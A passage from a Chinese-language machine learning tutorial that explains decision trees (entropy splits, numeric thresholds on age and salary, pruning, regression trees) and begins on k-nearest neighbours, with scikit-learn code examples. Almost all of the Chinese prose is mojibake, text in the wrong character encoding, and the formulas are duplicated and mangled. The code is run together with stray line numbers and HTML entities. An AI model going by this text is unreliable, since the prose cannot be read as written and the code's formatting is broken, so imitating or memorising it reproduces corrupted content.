‘ï¼ŒåŒºåˆ†è¿™ä¸¤ç±»æ•°æ®ç‚¹ã€‚æœ€åå¯è§†åŒ–æ‰€å¾—çš„è¾¹ç•Œã€‚ 12345678910111213141516171819202122from sklearn.tree import DecisionTreeClassifier# ç¼–å†™ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œè¿”å›ä¹‹åçš„å¯è§†åŒ–ç½‘æ ¼def get_grid(data): x_min, x_max = data[:, 0].min() - 1, data[:, 0].max() + 1 y_min, y_max = data[:, 1].min() - 1, data[:, 1].max() + 1 return np.meshgrid(np.arange(x_min, x_max, 0.01), np.arange(y_min, y_max, 0.01))# max_depthå‚æ•°é™åˆ¶å†³ç­–æ ‘çš„æ·±åº¦clf_tree = DecisionTreeClassifier(criterion=&#x27;entropy&#x27;, max_depth=3, random_state=17)# è®­ç»ƒå†³ç­–æ ‘clf_tree.fit(train_data, train_labels)# å¯è§†åŒ–xx, yy = get_grid(train_data)predicted = clf_tree.predict(np.c_[xx.ravel(), yy.ravel()]).reshape(xx.shape)plt.pcolormesh(xx, yy, predicted, cmap=&#x27;autumn&#x27;)plt.scatter(train_data[:, 0], train_data[:, 1], c=train_labels, s=100, cmap=&#x27;autumn&#x27;, edgecolors=&#x27;black&#x27;, linewidth=1.5) é€šè¿‡ pydotplus å’Œ export_graphviz åº“æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„çœ‹åˆ°å†³ç­–æ ‘æœ¬èº«æ˜¯æ€æ ·çš„ã€‚ä½¿ç”¨ StringIO() å‡½æ•°å¼€è¾Ÿä¸€ä¸ªç¼“å­˜ç©ºé—´ä¿å­˜å†³ç­–æ ‘ï¼Œé€šè¿‡ export_graphviz() å‡½æ•°ä»¥ DOT æ ¼å¼å¯¼å‡ºå†³ç­–æ ‘çš„ GraphViz è¡¨ç¤ºï¼Œç„¶åå°†å…¶å†™å…¥ out_file ä¸­ã€‚ä½¿ç”¨ graph_from_dot_data() å‡½æ•°è¯»å…¥æ•°æ®å¹¶é€šè¿‡ Image() å‡½æ•°æ˜¾ç¤ºå†³ç­–æ ‘ã€‚ 123456789101112!pip install pydotplus # å®‰è£…å¿…è¦æ¨¡å—from ipywidgets import Imagefrom io import StringIOimport pydotplusfrom sklearn.tree import export_graphvizdot_data = StringIO()export_graphviz(clf_tree, feature_names=[&#x27;x1&#x27;, &#x27;x2&#x27;], out_file=dot_data, filled=True)graph = pydotplus.graph_from_dot_data(dot_data.getvalue())Image(value=graph.create_png()) ) ä¸Šå›¾è¡¨æ˜ï¼Œåœ¨æœ€æ·±çš„ä¸€å±‚ï¼Œæ ‘å°†ç©ºé—´ã€Œåˆ‡å‰²ã€ä¸º8ä¸ªçŸ©å½¢ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ ‘æœ‰8ä¸ªå¶èŠ‚ç‚¹ã€‚åœ¨æ¯ä¸ªçŸ©å½¢ä¹‹ä¸­ï¼Œæ ‘å°†æ ¹æ®æ•°é‡è¾ƒå¤šçš„å¯¹è±¡çš„æ ‡ç­¾åšå‡ºé¢„æµ‹ã€‚ æˆ‘ä»¬å¦‚ä½•ã€Œè¯»æ‡‚ã€è¿™é¢—å†³ç­–æ ‘ï¼Ÿ ä¸Šä¸ªç¤ºä¾‹ä¸­ï¼Œæ€»å…±æœ‰ 200 ä¸ªåˆæˆæ•°æ®ï¼ˆæ ·æœ¬ï¼‰ï¼Œæ¯ä¸ªåˆ†ç±»å„æœ‰ 100 ä¸ªåˆæˆæ•°æ®ã€‚åˆå§‹çŠ¶æ€çš„ç†µæ˜¯æœ€å¤§çš„ï¼Œå³ ğ‘†=1S=1ã€‚æ¥ç€ï¼Œé€šè¿‡æ¯”è¾ƒ ğ‘¥2x2 ä¸ 1.211 çš„å¤§å°è¿›è¡Œç¬¬ä¸€æ¬¡åˆ†å‰²ï¼Œå°†æ ·æœ¬åˆ†æˆä¸¤ç»„ï¼ˆä½ å¯ä»¥åœ¨ä¸Šå›¾ä¸­æ‰¾åˆ°è¿™ä¸€éƒ¨åˆ†è¾¹ç•Œï¼‰ã€‚åŸºäºè¿™ä¸€æ¬¡åˆ†å‰²ï¼Œå·¦å³ä¸¤ç»„çš„ç†µéƒ½ä¸‹é™äº†ã€‚è¿™ä¸€è¿‡ç¨‹æŒç»­è¿›è¡Œï¼Œç›´åˆ°æ ‘çš„æ·±åº¦è¾¾åˆ° 3ã€‚åœ¨ä¸Šå›¾ä¸­ï¼Œå±äºç¬¬ä¸€ç±»çš„æ ·æœ¬æ•°é‡è¶Šå¤šï¼Œè¯¥èŠ‚ç‚¹çš„æ©™è‰²å°±è¶Šæ·±ï¼Œå±äºç¬¬äºŒç±»çš„æ ·æœ¬è¶Šå¤šï¼Œè¯¥èŠ‚ç‚¹çš„è“è‰²å°±è¶Šæ·±ã€‚è‹¥ä¸¤ç±»æ ·æœ¬çš„æ•°é‡ç›¸ç­‰ï¼Œåˆ™ä¸ºç™½è‰²ï¼Œæ¯”å¦‚æ ¹èŠ‚ç‚¹çš„ä¸¤ç±»æ ·æœ¬æ•°é‡ç›¸åŒï¼Œæ‰€ä»¥å®ƒæ˜¯ç™½è‰²çš„ å†³ç­–æ ‘å¦‚ä½•åº”ç”¨åˆ°æ•°å€¼ç‰¹å¾ï¼Ÿ å‡è®¾æœ‰ä¸€ä¸ªæ•°å€¼ç‰¹å¾ã€Œå¹´é¾„ã€ï¼Œè¯¥ç‰¹å¾æœ‰å¤§é‡çš„å”¯ä¸€å€¼ã€‚å†³ç­–æ ‘å°†é€šè¿‡æŸ¥çœ‹ã€Œå¹´é¾„ &lt; 17ã€ã€ã€Œå¹´é¾„ &lt; 22.87ã€è¿™æ ·çš„äºŒå…ƒå±æ€§å¯»æ‰¾æœ€å¥½çš„åˆ†å‰²ï¼Œåˆ†å‰²çš„å¥½åç”±æŸç§ä¿¡æ¯å¢ç›Šæ ‡å‡†è¡¡é‡ã€‚ä½†åœ¨æ„å»ºæ ‘çš„æ¯ä¸€æ­¥ä¸­ï¼Œä¼šæœ‰è¿‡å¤šçš„äºŒå…ƒå±æ€§å¯ä¾›é€‰æ‹©ï¼Œæ¯”å¦‚ã€Œè–ªæ°´ã€åŒæ ·èƒ½ä»¥å¾ˆå¤šæ–¹å¼è¿›è¡Œåˆ†å‰²ï¼Œä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨å¯å‘å¼ç®—æ³•æ¥é™åˆ¶é€‰æ‹©çš„å±æ€§æ•°é‡ã€‚ çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾æœ‰å¦‚ä¸‹æ•°æ®é›†ï¼š 123data = pd.DataFrame(&#123;&#x27;Age&#x27;: [17, 64, 18, 20, 38, 49, 55, 25, 29, 31, 33], &#x27;Loan Default&#x27;: [1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1]&#125;)data ä½¿ç”¨ sort_values() æ–¹æ³•æ ¹æ®å¹´é¾„è¿›è¡Œå‡åºæ’åˆ—ã€‚ 1data.sort_values(&#x27;Age&#x27;) è®­ç»ƒä¸€ä¸ªå†³ç­–æ ‘æ¨¡å‹ï¼Œå¹¶å¯è§†åŒ–ã€‚ 12345678age_tree = DecisionTreeClassifier(random_state=17)age_tree.fit(data[&#x27;Age&#x27;].values.reshape(-1, 1), data[&#x27;Loan Default&#x27;].values)dot_data = StringIO()export_graphviz(age_tree, feature_names=[&#x27;Age&#x27;], out_file=dot_data, filled=True)graph = pydotplus.graph_from_dot_data(dot_data.getvalue())Image(value=graph.create_png()) ä¸Šå›¾å¯è§ï¼Œè¯¥å†³ç­–æ ‘ä½¿ç”¨ä»¥ä¸‹ 5 ä¸ªå€¼æ¥è¯„ä¼°å¹´é¾„ï¼š43.5ã€19ã€22.5ã€30ã€32ã€‚å¦‚æœä½ ä»”ç»†è§‚å¯Ÿï¼Œä½ ä¼šå‘ç°å®ƒä»¬å°±æ˜¯ç›®æ ‡å˜é‡ï¼ˆLoan Defaultï¼‰å‡ºç°å˜åŒ–ï¼ˆä» 1ã€Œåˆ‡æ¢ã€åˆ° 0 æˆ–ä» 0ã€Œåˆ‡æ¢ã€åˆ° 1ï¼‰æ—¶é‚£ä¸¤ä¸ªå¹´é¾„çš„å¹³å‡å€¼ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ª 38 å²çš„å®¢æˆ·æ²¡èƒ½å¿è¿˜è´·æ¬¾ï¼ˆç›®æ ‡å˜é‡ä¸º 1ï¼‰ï¼Œè€Œä¸€ä¸ª 49 å²çš„å®¢æˆ·è¿˜è´·äº†ï¼ˆç›®æ ‡å˜é‡ä¸º 0ï¼‰ï¼Œé‚£ä¹ˆæ ‘ä½¿ç”¨çš„è¯„ä¼°å€¼å°±æ˜¯ 38 å’Œ 49 çš„å‡å€¼ï¼Œå³ 43.5ã€‚æ ‘å¯»æ‰¾é‚£äº›ç›®æ ‡å˜é‡å‘ç”Ÿå˜åŒ–çš„å€¼ï¼Œä»¥æ­¤ä½œä¸ºã€Œåˆ‡å‰²ã€çš„é˜ˆå€¼ã€‚ ä¸‹é¢è€ƒè™‘ä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­ï¼ŒæŠŠã€Œè–ªæ°´ã€å˜é‡ï¼ˆä»¥åƒç¾å…ƒæ¯å¹´ä¸ºå•ä½ï¼‰åŠ å…¥æ•°æ®é›†ã€‚ 1234data2 = pd.DataFrame(&#123;&#x27;Age&#x27;: [17, 64, 18, 20, 38, 49, 55, 25, 29, 31, 33], &#x27;Salary&#x27;: [25, 80, 22, 36, 37, 59, 74, 70, 33, 102, 88], &#x27;Loan Default&#x27;: [1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1]&#125;)data2.sort_values(&#x27;Age&#x27;) ä¸Šè¡¨å¯è§ï¼Œå¦‚æœæ ¹æ®å¹´é¾„æ’åºï¼Œç›®æ ‡å˜é‡ï¼ˆLoan Defaultï¼‰å°†åˆ‡æ¢ï¼ˆä» 1 åˆ° 0 æˆ–ä» 0 åˆ° 1ï¼‰5 æ¬¡ã€‚ ä¸‹è¡¨å¯è§ï¼Œå¦‚æœæ ¹æ®è–ªæ°´æ’åºï¼Œå®ƒå°†åˆ‡æ¢ 7 æ¬¡ã€‚ 1data2.sort_values(&#x27;Salary&#x27;) ä¸‹é¢çœ‹çœ‹æ ‘å°†å¦‚ä½•é€‰æ‹©ç‰¹å¾ã€‚ 12345678age_sal_tree = DecisionTreeClassifier(random_state=17)age_sal_tree.fit(data2[[&#x27;Age&#x27;, &#x27;Salary&#x27;]].values, data2[&#x27;Loan Default&#x27;].values)dot_data = StringIO()export_graphviz(age_sal_tree, feature_names=[&#x27;Age&#x27;, &#x27;Salary&#x27;], out_file=dot_data, filled=True)graph = pydotplus.graph_from_dot_data(dot_data.getvalue())Image(value=graph.create_png()) ä¸Šå›¾è¡¨æ˜ï¼Œæ ‘åŒæ—¶æ ¹æ®è–ªæ°´å’Œå¹´é¾„è¿›è¡Œåˆ†åŒºï¼Œæœ‰äº›èŠ‚ç‚¹çš„åˆ†å‰²é˜ˆå€¼é€‰æ‹©äº†å¹´é¾„ï¼Œæœ‰äº›é€‰æ‹©äº†è–ªæ°´ã€‚æ ‘ä¸ºä½•é€‰æ‹©è¿™äº›ç‰¹å¾ï¼Ÿå› ä¸ºæ ¹æ®åŸºå°¼ä¸ç¡®å®šæ€§è´¨é‡æ ‡å‡†ï¼Œå®ƒä»¬æä¾›äº†æ›´å¥½çš„åˆ†åŒºã€‚ ç»“è®ºï¼šå†³ç­–æ ‘å¤„ç†æ•°å€¼ç‰¹å¾æœ€ç®€å•çš„å¯å‘å¼ç®—æ³•æ˜¯å‡åºæ’åˆ—å®ƒçš„å€¼ï¼Œç„¶ååªå…³æ³¨ç›®æ ‡å˜é‡å‘ç”Ÿæ”¹å˜çš„é‚£äº›å€¼ã€‚ æ­¤å¤–ï¼Œå½“æ•°æ®é›†å…·æœ‰å¤§é‡æ•°å€¼ç‰¹å¾ï¼Œä¸”æ¯ä¸ªç‰¹å¾å…·æœ‰å¤§é‡å”¯ä¸€å€¼æ—¶ï¼Œåªé€‰æ‹©æœ€é«˜çš„Nä¸ªé˜ˆå€¼ï¼Œå³ï¼Œä»…ä»…ä½¿ç”¨æä¾›æœ€é«˜å¢ç›Šçš„å‰Nä¸ªå€¼ã€‚è¿™ä¸€è¿‡ç¨‹å¯ä»¥çœ‹æˆæ˜¯æ„é€ äº†ä¸€æ£µæ·±åº¦ä¸º 1 çš„æ ‘ï¼Œè®¡ç®—ç†µï¼ˆæˆ–åŸºå°¼ä¸ç¡®å®šæ€§ï¼‰ï¼Œç„¶åé€‰æ‹©æœ€ä½³é˜ˆå€¼ç”¨äºæ¯”è¾ƒã€‚æ¯”æ–¹è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ ¹æ®ã€Œè–ªæ°´ â‰¤ 34.5ã€åˆ†å‰²ï¼Œå·¦å­ç»„çš„ç†µä¸º 0ï¼ˆæ‰€æœ‰å®¢æˆ·éƒ½æ˜¯ã€Œä¸å¥½çš„ã€ï¼‰ï¼Œè€Œå³è¾¹çš„ç†µä¸º 0.954ï¼ˆ3 ä¸ªã€Œä¸å¥½çš„ã€ï¼Œ5 ä¸ªã€Œå¥½çš„ã€ï¼Œä½ å¯ä»¥è‡ªè¡Œç¡®è®¤è¿™ä¸€ç‚¹ï¼Œè¿™å°†ä½œä¸ºä½œä¸šçš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œä¿¡æ¯å¢ç›Šå¤§æ¦‚æ˜¯ 0.3ã€‚å¦‚æœæˆ‘ä»¬æ ¹æ®ã€Œè–ªæ°´ â‰¤ 95ã€åˆ†å‰²ï¼Œå·¦è¾¹çš„å­ç»„çš„ç†µä¼šæ˜¯ 0.97ï¼ˆ6 ä¸ªã€Œä¸å¥½çš„ã€ï¼Œ4 ä¸ªã€Œå¥½çš„ã€ï¼‰ï¼Œè€Œå³è¾¹çš„ç†µä¼šæ˜¯ 0ï¼ˆè¯¥ç»„åªåŒ…å« 1 ä¸ªå¯¹è±¡ï¼‰ï¼Œä¿¡æ¯å¢ç›Šå¤§çº¦æ˜¯ 0.11ã€‚å¦‚æœä»¥è¿™æ ·çš„æ–¹å¼è®¡ç®—æ¯ç§åˆ†åŒºçš„ä¿¡æ¯å¢ç›Šï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨æ‰€æœ‰ç‰¹å¾æ„é€ ä¸€æ£µå¤§å†³ç­–æ ‘ä¹‹å‰å°±å¯ä»¥é€‰å‡ºæ¯ä¸ªæ•°å€¼ç‰¹å¾çš„é˜ˆå€¼ã€‚ æ ‘çš„å…³é”®å‚æ•° ç†è®ºä¸Šè®²ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªå†³ç­–æ ‘ï¼Œç›´åˆ°æ¯ä¸ªå¶èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œä½†è¿™æ ·åšå®¹æ˜“è¿‡æ‹Ÿåˆï¼Œå¯¼è‡´å…¶åœ¨æ–°æ•°æ®ä¸Šçš„è¡¨ç°ä¸ä½³ã€‚å¦‚æœä½ è¿™ä¹ˆåšï¼Œåœ¨æ ‘çš„æœ€æ·±å¤„ï¼Œå¯èƒ½ä¼šå­˜åœ¨ç”±æ— å…³ç´§è¦çš„ç‰¹å¾ç»„æˆçš„åˆ†åŒºï¼Œä¾‹å¦‚æ ¹æ®ã€Œå®¢æˆ·è£¤å­çš„é¢œè‰²ã€è¿™ä¸€ç‰¹å¾è¿›è¡Œåˆ†åŒºï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›å‘ç”Ÿã€‚ ä½†åœ¨ä¸¤ç§æƒ…å†µä¸‹ï¼Œæ ‘å¯ä»¥è¢«æ„å»ºåˆ°æœ€å¤§æ·±åº¦ï¼ˆæ¯ä¸ªå¶èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼‰ï¼š éšæœºæ£®æ—ã€‚å®ƒå°†æ„å»ºä¸ºæœ€å¤§æ·±åº¦çš„å•ä¸ªæ ‘çš„å“åº”è¿›è¡Œå¹³å‡ï¼ˆç¨åæˆ‘ä»¬å°†è®¨è®ºä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼‰ã€‚ å†³ç­–æ ‘ä¿®å‰ªã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œæ ‘é¦–å…ˆè¢«æ„é€ æˆæœ€å¤§æ·±åº¦ã€‚ç„¶åï¼Œä»åº•éƒ¨å¼€å§‹ï¼ŒåŸºäºäº¤å‰éªŒè¯æ¥æ¯”è¾ƒæœ‰åˆ†åŒº/æ— åˆ†åŒºæƒ…å½¢ä¸‹æ ‘çš„è´¨é‡æƒ…å†µï¼Œè¿›è€Œç§»é™¤æ ‘çš„ä¸€äº›èŠ‚ç‚¹ã€‚ ä¸‹å›¾æ˜¯è¿‡æ‹Ÿåˆçš„å†³21275.png) å¸¸è§çš„è§£å†³å†³ç­–æ ‘è¿‡æ‹Ÿåˆçš„æ–¹æ³•ä¸ºï¼š äººå·¥é™åˆ¶æ·±åº¦æˆ–å¶èŠ‚ç‚¹çš„æœ€å°‘æ ·æœ¬æ•°ã€‚ å¯¹æ ‘è¿›è¡Œå‰ªæã€‚ scikit-learn çš„ DecisionTreeClassifier ç±» sklearn.tree.DecisionTreeClassifier ç±»çš„ä¸»è¦å‚æ•°ä¸ºï¼š max_depth æ ‘çš„æœ€å¤§æ·±åº¦ï¼› max_features æœç´¢æœ€ä½³åˆ†åŒºæ—¶çš„æœ€å¤§ç‰¹å¾æ•°ï¼ˆç‰¹å¾å¾ˆå¤šæ—¶ï¼Œè®¾ç½®è¿™ä¸ªå‚æ•°å¾ˆæœ‰å¿…è¦ï¼Œå› ä¸ºåŸºäºæ‰€æœ‰ç‰¹å¾æœç´¢åˆ†åŒºä¼šå¾ˆã€Œæ˜‚è´µã€ï¼‰ï¼› min_samples_leaf å¶èŠ‚ç‚¹çš„æœ€å°‘æ ·æœ¬æ•°ã€‚ æ ‘çš„å‚æ•°éœ€è¦æ ¹æ®è¾“å…¥æ•°æ®è®¾å®šï¼Œé€šå¸¸é€šè¿‡äº¤å‰éªŒè¯å¯ä»¥ç¡®å®šå‚æ•°èŒƒå›´ï¼Œä¸‹æ–‡ä¼šå…·ä½“è®¨è®ºäº¤å‰éªŒè¯ã€‚ å›å½’é—®é¢˜ä¸­çš„å†³ç­–æ ‘ å½“å¯¹æ•°å€¼å˜é‡è¿›è¡Œé¢„æµ‹æ—¶ï¼Œæˆ‘ä»¬æ„é€ å†³ç­–æ ‘çš„æ€è·¯å’Œåˆ†ç±»é—®é¢˜æ—¶æ‰€ç”¨çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œä½†è¡¡é‡å†³ç­–æ ‘å¥½åçš„è´¨é‡æ ‡å‡†æ”¹å˜äº†ï¼Œç°åœ¨å®ƒçš„è´¨é‡æ ‡å‡†å¦‚ä¸‹ï¼š D=1â„“âˆ‘i=1â„“(yiâˆ’1â„“âˆ‘j=1â„“yj)2,D = \\frac{1}{\\ell} \\sum\\limits_{i =1}^{\\ell} (y_i - \\frac{1}{\\ell} \\sum\\limits_{j=1}^{\\ell} y_j)^2, D=â„“1â€‹i=1âˆ‘â„“â€‹(yiâ€‹âˆ’â„“1â€‹j=1âˆ‘â„“â€‹yjâ€‹)2, å…¶ä¸­ï¼Œâ„“â„“ æ˜¯å¶èŠ‚ç‚¹ä¸­çš„æ ·æœ¬æ•°ï¼Œğ‘¦ğ‘–y**i æ˜¯ç›®æ ‡å˜é‡çš„å€¼ã€‚ç®€å•æ¥è¯´ï¼Œé€šè¿‡æœ€å°åŒ–æ–¹å·®ï¼Œä½¿æ¯ä¸ªå¶å­ä¸­çš„ç›®æ ‡ç‰¹å¾çš„å€¼å¤§è‡´ç›¸ç­‰ï¼Œä»¥æ­¤æ¥åˆ’åˆ†è®­ç»ƒé›†çš„ç‰¹å¾ã€‚ ç¤ºä¾‹ è®©æˆ‘ä»¬åŸºäºä»¥ä¸‹å‡½æ•°ç”Ÿæˆä¸€äº›å¸¦å™ªæ•°æ®ï¼š f(x)=eâˆ’x2+1.5âˆ—eâˆ’(xâˆ’2)2f(x) = e^{-x ^ 2} + 1.5 * e^{-(x - 2) ^ 2} f(x)=eâˆ’x2+1.5âˆ—eâˆ’(xâˆ’2)2 æ¥ç€åœ¨ç”Ÿæˆçš„æ•°æ®ä¸Šè®­ç»ƒä¸€é¢—å†³ç­–æ ‘ï¼Œå¹¶è¿›è¡Œé¢„æµ‹ï¼Œè°ƒç”¨ plt æ–¹æ³•ç”»å‡ºç»“æœç¤ºæ„å›¾ã€‚ 12345678910111213141516171819202122232425262728293031323334353637from sklearn.tree import DecisionTreeRegressorn_train = 150n_test = 1000noise = 0.1def f(x): x = x.ravel() return np.exp(-x ** 2) + 1.5 * np.exp(-(x - 2) ** 2)def generate(n_samples, noise): X = np.random.rand(n_samples) * 10 - 5 X = np.sort(X).ravel() y = np.exp(-X ** 2) + 1.5 * np.exp(-(X - 2) ** 2) + \\ np.random.normal(0.0, noise, n_samples) X = X.reshape((n_samples, 1)) return X, yX_train, y_train = generate(n_samples=n_train, noise=noise)X_test, y_test = generate(n_samples=n_test, noise=noise)reg_tree = DecisionTreeRegressor(max_depth=5, random_state=17)reg_tree.fit(X_train, y_train)reg_tree_pred = reg_tree.predict(X_test)plt.figure(figsize=(10, 6))plt.plot(X_test, f(X_test), &quot;b&quot;)plt.scatter(X_train, y_train, c=&quot;b&quot;, s=20)plt.plot(X_test, reg_tree_pred, &quot;g&quot;, lw=2)plt.xlim([-5, 5])plt.title(&quot;Decision tree regressor, MSE = %.2f&quot; % (np.sum((y_test - reg_tree_pred) ** 2) / n_test))plt.show() ä¸Šå›¾è¡¨æ˜ï¼Œå†³ç­–æ ‘ä½¿ç”¨åˆ†æ®µçš„å¸¸æ•°å‡½æ•°é€¼è¿‘æ•°æ®ã€‚ æœ€è¿‘é‚»æ–¹æ³• æœ€è¿‘é‚»æ–¹æ³•ï¼ˆK è¿‘é‚»æˆ– k-NNï¼‰æ˜¯å¦ä¸€ä¸ªéå¸¸æµè¡Œçš„åˆ†ç±»æ–¹æ³•ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨äºå›å½’é—®é¢˜ã€‚å’Œå†³ç­–æ ‘ç±»ä¼¼ï¼Œè¿™æ˜¯æœ€å®¹æ˜“ç†è§£çš„åˆ†ç±»æ–¹æ³•ä¹‹ä¸€ã€‚è¿™ä¸€æ–¹æ³•éµå¾ªç´§å¯†æ€§å‡è¯´ï¼šå¦‚æœæ ·æœ¬é—´çš„è·ç¦»èƒ½ä»¥è¶³å¤Ÿå¥½çš„æ–¹æ³•è¡¡é‡ï¼Œé‚£ä¹ˆç›¸ä¼¼çš„æ ·æœ¬æ›´å¯èƒ½å±äºåŒä¸€åˆ†ç±»ã€‚ æ¯”å¦‚ï¼Œæ ¹æ®æœ€è¿‘é‚»æ–¹æ³•ï¼Œä¸‹å›¾ä¸­çš„ç»¿çƒå°†è¢«åˆ†ç±»ä¸ºã€Œè“è‰²ã€è€Œä¸æ˜¯ã€Œçº¢è‰²ã€ï¼Œå› ä¸ºå®ƒä¸è“çƒçš„è·ç¦»æ›´è¿‘ã€‚ å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœä½ ä¸çŸ¥é“è“ç‰™è€³æœºå±äºä»€ä¹ˆç±»åˆ«ï¼Œä½ å¯ä»¥æŸ¥æ‰¾ 5 ä¸ªç›¸ä¼¼çš„è€³æœºï¼Œå¦‚æœå…¶ä¸­ 4 ä¸ªæ ‡è®°ä¸ºã€Œé…ä»¶ã€ç±»ï¼Œåªæœ‰ 1 ä¸ªæ ‡è®°ä¸ºã€Œç§‘æŠ€ã€ç±»ï¼Œé‚£ä¹ˆæ ¹æ®æœ€è¿‘é‚»æ–¹æ³•ï¼Œå®ƒå±äºã€Œé…ä»¶ã€ç±»ã€‚ åœ¨æœ€è¿‘é‚»æ–¹æ³•ä¸­ï¼Œä¸ºäº†å¯¹æµ‹è¯•é›†ä¸­çš„æ¯ä¸ªæ ·æœ¬è¿›è¡Œåˆ†ç±»ï¼Œéœ€è¦ä¾æ¬¡è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š è®¡ç®—è®­ç»ƒé›†ä¸­æ¯ä¸ªæ ·æœ¬ä¹‹é—´çš„è·ç¦»ã€‚ ä»è®­ç»ƒé›†ä¸­é€‰å– k ä¸ªè·ç¦»æœ€è¿‘çš„æ ·æœ¬ã€‚ æµ‹è¯•æ ·æœ¬çš„ç±»åˆ«å°†æ˜¯å®ƒ k ä¸ªæœ€è¿‘é‚»ä¸­æœ€å¸¸è§çš„åˆ†ç±»ã€‚ åœ¨å›å½’é—®é¢˜ä¸­åº”ç”¨æœ€è¿‘é‚»æ–¹æ³•å¾ˆç®€å•ï¼Œä»…éœ€å°†ä¸Šè¿°æ­¥éª¤åšä¸€ä¸ªå°å°çš„æ”¹åŠ¨ï¼šç¬¬ä¸‰æ­¥ä¸è¿”å›åˆ†ç±»ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ•°å­—ï¼Œå³ç›®æ ‡å˜é‡åœ¨é‚»å±…ä¸­çš„å‡å€¼æˆ–ä¸­ä½æ•°ã€‚ è¿™ä¸€æ–¹å¼çš„æ˜¾è‘—ç‰¹ç‚¹æ˜¯å®ƒå…·æœ‰æƒ°æ€§ï¼šå½“éœ€è¦å¯¹æµ‹è¯•æ ·æœ¬è¿›è¡Œåˆ†ç±»æ—¶ï¼Œè®¡ç®—åªåœ¨é¢„æµ‹é˜¶æ®µè¿›è¡Œã€‚ç”±äºè¿™ç§ç‰¹ç‚¹ï¼Œæœ€è¿‘é‚»æ–¹æ³•äº‹å…ˆå¹¶ä¸åŸºäºè®­ç»ƒæ ·æœ¬åˆ›å»ºæ¨¡å‹ï¼Œè¿™ä¸ä¸Šæ–‡æåˆ°çš„å†³ç­–æ ‘ä¸åŒã€‚å†³ç­–æ ‘æ˜¯åŸºäºè®­ç»ƒé›†æ„å»ºçš„ï¼Œåœ¨é¢„æµ‹é˜¶æ®µä»…é€šè¿‡éå†å†³ç­–æ ‘å°±å¯ä»¥å®ç°å¿«é€Ÿåœ°åˆ†ç±»ã€‚ æœ€è¿‘é‚»æ–¹æ³•çš„å®é™…åº”ç”¨ åœ¨æŸäº›æ¡ˆä¾‹ä¸­ï¼Œk-NN å¯ä»¥ä½œä¸ºä¸€ä¸ªæ¨¡å‹çš„åŸºçº¿ã€‚ åœ¨ Kaggle ç«èµ›ä¸­ï¼Œk-NN å¸¸å¸¸ç”¨äºæ„å»ºå…ƒç‰¹å¾ï¼ˆå³ k-NN çš„é¢„æµ‹ç»“æœä½œä¸ºå…¶ä»–æ¨¡å‹çš„è¾“å…¥ï¼‰ï¼Œæˆ–ç”¨äºå †å /æ··åˆã€‚ æœ€è¿‘é‚»æ–¹æ³•è¿˜å¯ä»¥æ‰©å±•åˆ°æ¨èç³»ç»Ÿç­‰ä»»åŠ¡ä¸­ã€‚ åœ¨å¤§å‹æ•°æ®é›†ä¸Šï¼Œå¸¸å¸¸ä½¿ç”¨é€¼è¿‘æ–¹æ³•æœç´¢æœ€è¿‘é‚»ã€‚ k-NN åˆ†ç±»/å›å½’çš„æ•ˆæœå–å†³äºä¸€äº›å‚æ•°ï¼š é‚»å±…æ•° kã€‚ æ ·æœ¬ä¹‹é—´çš„è·ç¦»åº¦é‡ï¼ˆå¸¸è§çš„åŒ…æ‹¬ Hammingï¼Œæ¬§å‡ é‡Œå¾—ï¼Œä½™å¼¦å’Œ Minkowski è·ç¦»ï¼‰ã€‚æ³¨æ„ï¼Œå¤§éƒ¨åˆ†è·ç¦»è¦æ±‚æ•°æ®åœ¨åŒä¸€å°ºåº¦ä¸‹ï¼Œä¾‹å¦‚ã€Œè–ªæ°´ã€ç‰¹å¾çš„æ•°å€¼åœ¨åƒçº§ï¼Œã€Œå¹´é¾„ã€ç‰¹å¾çš„æ•°å€¼å´åœ¨ç™¾çº§ï¼Œå¦‚æœç›´æ¥å°†ä»–ä»¬ä¸¢è¿›æœ€è¿‘é‚»æ¨¡å‹ä¸­ï¼Œã€Œå¹´é¾„ã€ç‰¹å¾å°±ä¼šå—åˆ°æ¯”è¾ƒå¤§çš„å½±å“ã€‚ é‚»å±…çš„æƒé‡ï¼ˆæ¯ä¸ªé‚»å±…å¯èƒ½è´¡çŒ®ä¸åŒçš„æƒé‡ï¼Œä¾‹å¦‚ï¼Œæ ·æœ¬è¶Šè¿œï¼Œæƒé‡è¶Šä½ï¼‰ã€‚ scikit-learn çš„ KNeighborsClassifier ç±» sklearn.neighbors.KNeighborsClassifier ç±»çš„ä¸»è¦å‚æ•°ä¸ºï¼š weightsï¼šå¯è®¾ä¸º uniformï¼ˆæ‰€æœ‰æƒé‡ç›¸ç­‰ï¼‰ï¼Œdistanceï¼ˆæƒé‡å’Œåˆ°æµ‹è¯•æ ·æœ¬çš„è·ç¦»æˆåæ¯”ï¼‰ï¼Œæˆ–ä»»ä½•å…¶ä»–ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ã€‚ algorithmï¼ˆå¯é€‰ï¼‰ï¼šå¯è®¾ä¸º bruteã€ball_treeã€KD_treeã€autoã€‚è‹¥è®¾ä¸º bruteï¼Œé€šè¿‡è®­ç»ƒé›†ä¸Šçš„ç½‘æ ¼æœç´¢æ¥è®¡ç®—æ¯ä¸ªæµ‹è¯•æ 